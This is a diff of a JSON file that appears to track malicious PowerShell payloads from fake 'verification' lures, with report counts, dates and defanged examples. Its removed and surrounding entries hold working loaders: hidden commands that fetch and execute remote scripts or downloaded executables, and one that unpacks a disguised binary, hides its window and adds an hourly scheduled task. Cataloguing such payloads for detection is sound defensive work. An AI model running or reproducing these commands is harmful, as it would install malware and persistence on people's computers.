@@ -1149,19 +1149,6 @@
     ]
   },
   {
-    "Pattern": "POWerShELL -WindowStyle Hidden  -c \\\"irm https:\\/\\/167-148-195-171.sslip.io\\/r.php?t=nywqcwqayp|iex\\\"",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-14T20:48:16.855000+00:00",
-    "LastSeen": "2026-11-14T20:48:16.855000+00:00",
-    "ReportIds": [
-      "cmwgvo49e0m0j0omlaaon818w"
-    ],
-    "PayloadExamples": [
-      "POWerShELL -WindowStyle Hidden  -c \\\"irm https:\\/\\/167-148-195-171[.]sslip[.]io\\/r.php?t=nywqcwqayp|iex\\\""
-    ]
-  },
-  {
     "Pattern": "Write-Host 'Verifying';$d=Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString('N').Substring(0,12));New-Item -ItemType Directory -Path $d -Force|Out-Null;$z=Join-Path $d 'bsdvaoqma0ilf.zip';$ok=$false;foreach($p in 0,10,25,40){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};foreach($b in @('<URL>')){try{Invoke-WebRequest -UseBasicParsing -Uri $b -OutFile $z;if(Test-Path $z){$ok=$true;break}}catch{}};if($ok){foreach($p in 55,70){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Expand-Archive -LiteralPath $z -DestinationPath $d -Force;Remove-Item -LiteralPath $z -Force;$n=Join-Path $d 'npp_x\\notepad++.exe';$bp=Join-Path $d 'npp_boot.ps1';Set-Content -LiteralPath $bp -Value \"Set-Location '$d\\npp_x';`$pp=Get-Process -Name 'notepad++' -ErrorAction SilentlyContinue|Where-Object {`$_.Path -eq '$n'};if(-not `$pp){`$np=Start-Process -FilePath '$n' -ArgumentList '-multiInst' -WindowStyle Hidden -PassThru;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class ZW{[DllImport(`\"user32.dll`\")]public static extern bool EnumWindows(CB c,IntPtr l);public delegate bool CB(IntPtr h,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport(`\"user32.dll`\")]public static extern bool ShowWindow(IntPtr h,int c);}';for(`$i=0;`$i -lt 60;`$i++){[ZW]::EnumWindows({param(`$h,`$l)`$q=[uint32]0;[void][ZW]::GetWindowThreadProcessId(`$h,[ref]`$q);if(`$q -eq `$np.Id){[void][ZW]::ShowWindow(`$h,0)};return `$true},[IntPtr]::Zero);Start-Sleep -Milliseconds 500}}catch{}}\";$tn=[guid]::NewGuid().ToString('N').Substring(0,16);& schtasks.exe /create /tn $tn /tr \"powershell.exe -w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" /sc HOURLY /mo 1 /f|Out-Null;foreach($p in 85,95,100){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Start-Process powershell.exe -ArgumentList \"-w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" -WindowStyle Hidden|Out-Null;Write-Host 'Verified'}else{Write-Host 'Verification failed';Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue};exit",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -1250,19 +1237,6 @@
     ],
     "PayloadExamples": [
       "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
-    ]
-  },
-  {
-    "Pattern": "powershell -w h -c \"iwr <URL> -OutFile $env:TEMP\\a.exe;start $env:TEMP\\a.exe\"",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-14T20:48:12.105000+00:00",
-    "LastSeen": "2026-11-14T20:48:12.105000+00:00",
-    "ReportIds": [
-      "cmwgvo0m00m050omlpv3izxoy"
-    ],
-    "PayloadExamples": [
-      "powershell -w h -c \"iwr https://kekman[.]space/verify.exe -OutFile $env:TEMP\\a.exe;start $env:TEMP\\a.exe\""
     ]
   },
   {
